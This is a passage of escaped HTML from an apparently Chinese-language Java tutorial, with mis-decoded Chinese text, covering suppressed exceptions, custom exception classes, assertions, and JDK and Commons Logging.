&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 04
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">process2&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">NullPointerException&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 03
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¦‚æœç”¨æ³¨é‡Šæ‰çš„æ–¹å¼å†™å°±ä¼šä¸¢å¤±&lt;code>NullPointerException&lt;/code>è¿™ä¸€æ¡&lt;/p>
&lt;ul>
&lt;li>åœ¨ä»£ç ä¸­è·å–åŸå§‹å¼‚å¸¸å¯ä»¥ä½¿ç”¨&lt;code>Throwable.getCause()&lt;/code>æ–¹æ³•ã€‚å¦‚æœè¿”å›&lt;code>null&lt;/code>ï¼Œè¯´æ˜å·²ç»æ˜¯â€œæ ¹å¼‚å¸¸â€äº†(Caused by: xxxx)&lt;/li>
&lt;li>å¦‚æœåœ¨finallyä¸­æŠ›å‡ºå¼‚å¸¸ï¼ˆå°½é‡åˆ«ï¼‰ï¼Œç”±äº&lt;code>catch&lt;/code>ä¸­å‡†å¤‡æŠ›å‡ºçš„å¼‚å¸¸å°±â€œæ¶ˆå¤±â€äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæ²¡æœ‰è¢«æŠ›å‡ºçš„å¼‚å¸¸ç§°ä¸ºâ€œè¢«å±è”½â€çš„å¼‚å¸¸Suppressed Exception&lt;/li>
&lt;li>å¦‚æœæˆ‘ä»¬éœ€è¦è·çŸ¥æ‰€æœ‰çš„å¼‚å¸¸ï¼Œå¯ä»¥å…ˆç”¨&lt;code>origin&lt;/code>å˜é‡ä¿å­˜åŸå§‹å¼‚å¸¸ï¼Œç„¶åè°ƒç”¨&lt;code>Throwable.addSuppressed()&lt;/code>ï¼ŒæŠŠåŸå§‹å¼‚å¸¸æ·»åŠ è¿›æ¥ï¼Œæœ€ååœ¨&lt;code>finally&lt;/code>æŠ›å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">parseInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;abc&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">finally&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addSuppressed&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">origin&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“&lt;code>catch&lt;/code>å’Œ&lt;code>finally&lt;/code>éƒ½æŠ›å‡ºäº†å¼‚å¸¸æ—¶ï¼Œè™½ç„¶&lt;code>catch&lt;/code>çš„å¼‚å¸¸è¢«å±è”½äº†ï¼Œä½†æ˜¯ï¼Œ&lt;code>finally&lt;/code>æŠ›å‡ºçš„å¼‚å¸¸ä»ç„¶åŒ…å«äº†å®ƒï¼š&lt;/p>
&lt;pre tabindex="0">&lt;code>Exception in thread &amp;#34;main&amp;#34; java.lang.IllegalArgumentException
at Main.main(Main.java:11)
Suppressed: java.lang.NumberFormatException: For input string: &amp;#34;abc&amp;#34;
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
at java.base/java.lang.Integer.parseInt(Integer.java:652)
at java.base/java.lang.Integer.parseInt(Integer.java:770)
at Main.main(Main.java:6)
&lt;/code>&lt;/pre>&lt;p>é€šè¿‡&lt;code>Throwable.getSuppressed()&lt;/code>å¯ä»¥è·å–æ‰€æœ‰çš„&lt;code>Suppressed Exception&lt;/code>&lt;/p>
&lt;h3 id="è‡ªå®šä¹‰å¼‚å¸¸">è‡ªå®šä¹‰å¼‚å¸¸&lt;/h3>
&lt;ul>
&lt;li>è§çš„åšæ³•æ˜¯è‡ªå®šä¹‰ä¸€ä¸ª&lt;code>BaseException&lt;/code>ä½œä¸ºâ€œæ ¹å¼‚å¸¸â€ï¼Œç„¶åï¼Œæ´¾ç”Ÿå‡ºå„ç§ä¸šåŠ¡ç±»å‹çš„å¼‚å¸¸ï¼›&lt;code>BaseException&lt;/code>éœ€è¦ä»ä¸€ä¸ªé€‚åˆçš„&lt;code>Exception&lt;/code>æ´¾ç”Ÿï¼Œé€šå¸¸å»ºè®®ä»&lt;code>RuntimeException&lt;/code>æ´¾ç”Ÿ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UserNotFoundException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">LoginFailedException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">BaseException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>è‡ªå®šä¹‰çš„&lt;code>BaseException&lt;/code>åº”è¯¥æä¾›å¤šä¸ªæ„é€ æ–¹æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">RuntimeException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">message&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">BaseException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cause&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ ·ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„æ—¶å€™ï¼Œå°±å¯ä»¥é€‰æ‹©åˆé€‚çš„æ„é€ æ–¹æ³•&lt;/p>
&lt;h3 id="æ–­è¨€">æ–­è¨€&lt;/h3>
&lt;ul>
&lt;li>JVMé»˜è®¤å…³é—­æ–­è¨€æŒ‡ä»¤ï¼Œéœ€ä¼ å…¥&lt;code>-enableassertions&lt;/code>æˆ–&lt;code>-ea&lt;/code>ï¼›è¿˜å¯ä»¥æœ‰é€‰æ‹©åœ°å¯¹ç‰¹å®šåœ°ç±»å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š&lt;code>-ea:com.itranswarp.sample.Main&lt;/code>ï¼Œè¡¨ç¤ºåªå¯¹&lt;code>com.itranswarp.sample.Main&lt;/code>è¿™ä¸ªç±»å¯ç”¨æ–­è¨€ï¼›æˆ–è€…å¯¹ç‰¹å®šåœ°åŒ…å¯ç”¨æ–­è¨€ï¼Œå‘½ä»¤è¡Œå‚æ•°æ˜¯ï¼š&lt;code>-ea:com.itranswarp.sample...&lt;/code>ï¼ˆæ³¨æ„ç»“å°¾æœ‰3ä¸ª&lt;code>.&lt;/code>ï¼‰ï¼Œè¡¨ç¤ºå¯¹&lt;code>com.itranswarp.sample&lt;/code>è¿™ä¸ªåŒ…å¯åŠ¨æ–­è¨€&lt;/li>
&lt;li>æ˜¯ä¸€ç§è°ƒè¯•æ–¹å¼ï¼Œå¤±è´¥æ—¶ä¼šæŠ›å‡º&lt;code>AssertionError&lt;/code>ï¼Œå¯¼è‡´ç¨‹åºç»“æŸé€€å‡º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">abs&lt;/span>&lt;span style="color:#f92672">(-&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">45&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;x must &amp;gt;= 0&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ä¼šå¸¦ä¸Šæ¶ˆæ¯
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>ä¸èƒ½ç”¨äºå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œåªåº”è¯¥ç”¨äºå¼€å‘å’Œæµ‹è¯•é˜¶æ®µï¼Œå¯¹äºå¯æ¢å¤çš„ç¨‹åºé”™è¯¯ï¼Œä¸åº”è¯¥ä½¿ç”¨æ–­è¨€&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åº”è¯¥ç›´æ¥æ•è·äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">arr&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">arr&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;array cannot be null&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="æ—¥å¿—">æ—¥å¿—&lt;/h2>
&lt;p>ä¸ºäº†å–ä»£&lt;code>System.out.println()&lt;/code>ï¼Œå°è£…å¥½äº†å¾ˆå¤šå¥½ç”¨çš„æ–¹æ³•&lt;/p>
&lt;h3 id="jdk-logging">JDK Logging&lt;/h3>
&lt;p>æ ‡å‡†åº“è‡ªå¸¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Level&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.logging.Logger&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Logger&lt;/span> &lt;span style="color:#111">logger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getGlobal&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">info&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start process...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">warning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;memory is running out...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">fine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ignored.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">logger&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">severe&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process will be terminated...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>JDKçš„Loggingå®šä¹‰äº†7ä¸ªæ—¥å¿—çº§åˆ«ï¼Œä»ä¸¥é‡åˆ°æ™®é€š&lt;/li>
&lt;/ul>
&lt;p>SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST&lt;/p>
&lt;ul>
&lt;li>å±€é™ï¼šé…ç½®ä¸å¤ªæ–¹ä¾¿ï¼Œéœ€è¦åœ¨JVMå¯åŠ¨æ—¶ä¼ é€’å‚æ•°&lt;code>-Djava.util.logging.config.file=&amp;lt;config-file-name&amp;gt;&lt;/code>ï¼Œä¸€æ—¦å¼€å§‹è¿è¡Œ&lt;code>main()&lt;/code>æ–¹æ³•ï¼Œå°±æ— æ³•ä¿®æ”¹é…ç½®&lt;/li>
&lt;/ul>
&lt;h3 id="commons-logging">Commons Logging&lt;/h3>
&lt;p>ç¬¬ä¸‰æ–¹ï¼Œç”±Apacheåˆ›å»ºï¼Œå¯ä»¥æŒ‚æ¥ä¸åŒçš„æ—¥å¿—ç³»ç»Ÿï¼Œå¹¶é€šè¿‡é…ç½®æ–‡ä»¶æŒ‡å®šæŒ‚æ¥çš„æ—¥å¿—ç³»ç»Ÿ&lt;/p>
&lt;p>å¯ä½œä¸ºæ—¥å¿—æ¥å£ï¼Œè€Œéæ—¥å¿—å®ç°&lt;/p>
&lt;ul>
&lt;li>é»˜è®¤æœç´¢Log4jï¼Œæ²¡æœ‰çš„è¯ç”¨JDK Logging&lt;/li>
&lt;li>ä½¿ç”¨å¾ˆç®€å•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.Log&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.logging.LogFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
